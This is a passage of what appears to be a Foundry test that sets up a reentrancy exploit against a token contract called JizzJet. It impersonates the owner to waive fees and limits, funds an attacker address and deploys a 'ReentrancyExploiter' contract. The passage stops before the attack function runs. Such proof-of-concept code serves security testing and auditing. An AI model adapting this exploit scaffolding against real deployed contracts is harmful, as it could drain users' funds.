        address owner = IJizzJet(TARGET).owner();
        vm.startPrank(owner);

        // Exclude attacker from fees to avoid tax during exploit
        IJizzJet(TARGET).excludeFromFee(attacker);

        // Set maxTxAmount to a high value to avoid limits
        IJizzJet(TARGET).setMaxTxPercent(100); // 100%

        // Get some initial tokens to the attacker
        uint256 initialTokens = IJizzJet(TARGET).balanceOf(owner) / 10;
        IJizzJet(TARGET).transfer(attacker, initialTokens);

        vm.stopPrank();

        // Deploy malicious contract
        exploiter = new ReentrancyExploiter(TARGET, attacker);

        // Fund the exploiter with some tokens
        vm.prank(attacker);
        IJizzJet(TARGET).transfer(address(exploiter), initialTokens / 2);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
